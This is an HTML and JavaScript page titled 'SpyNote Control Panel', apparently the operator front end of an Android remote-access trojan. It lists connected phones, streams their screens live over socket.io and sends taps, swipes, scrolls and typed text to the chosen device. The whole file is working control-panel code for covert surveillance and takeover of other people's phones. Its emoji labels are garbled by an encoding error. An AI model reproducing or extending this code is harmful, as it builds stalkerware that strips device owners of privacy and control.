<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: pixelated;
        }
        #fps-counter { position: fixed; top: 10px; right: 10px; font-size: 12px; color: #00ff88; }
        
        #keyboard { 
            position: fixed; bottom: 10px; left: 50%; transform: translateX(-50%); 
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 15px; 
            display: none; backdrop-filter: blur(10px);
        }
        #text-input { 
            width: 250px; padding: 10px; background: #333; color: white; 
            border: none; border-radius: 8px; margin-right: 10px;
        }
        button {
            padding: 12px 20px; margin: 0 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-size: 14px; transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); }
        #scroll-controls { text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="fps-counter">FPS: 0 | Device: -</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="scroll-controls">
        <button onclick="sendScroll('up')">‚¨ÜÔ∏è Scroll Up</button>
        <button onclick="sendScroll('down')">‚¨áÔ∏è Scroll Down</button>
        <button onclick="sendScroll('left')">‚¨ÖÔ∏è Left</button>
        <button onclick="sendScroll('right')">‚û°Ô∏è Right</button>
        <button onclick="toggleKeyboard()">‚å®Ô∏è Type</button>
    </div>

    <div id="keyboard">
        <input type="text" id="text-input" placeholder="Type text..." maxlength="100">
        <button onclick="sendText()">üì§ Send</button>
        <button onclick="toggleKeyboard()">‚ùå</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let dragging = false, startX = 0, startY = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const fpsCounter = document.getElementById('fps-counter');
        const textInput = document.getElementById('text-input');
        const keyboard = document.getElementById('keyboard');

        socket.on('connect', () => console.log('‚úÖ Web Connected'));
        socket.on('devices-update', (devices) => updateDeviceList(devices));

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    fpsCounter.textContent = `FPS: ${fps} | Device: ${currentDevice?.slice(0,8)}`;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${!info.connected ? 'disconnected' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <b>${info.model || id.slice(0,8)}</b><br>
                    <small>${info.brand || ''} ${info.version || ''}</small>
                    ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                </div>
            `).join('') || 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // üî• PERFECT TOUCH/MOUSE CONTROLS
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'tap', 
                    x: coords.x, 
                    y: coords.y 
                });
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'swipe', 
                    startX, startY, endX: coords.x, endY: coords.y 
                });
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        // üî• SCROLL CONTROLS
        function sendScroll(direction) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'scroll', 
                direction 
            });
        }

        // üî• KEYBOARD TYPING
        function toggleKeyboard() {
            keyboard.style.display = keyboard.style.display === 'block' ? 'none' : 'block';
        }

        function sendText() {
            const text = textInput.value.trim();
            if (text && currentDevice) {
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'type', 
                    text 
                });
                textInput.value = '';
            }
        }

        textInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendText();
        });
    </script>
</body>
</html>
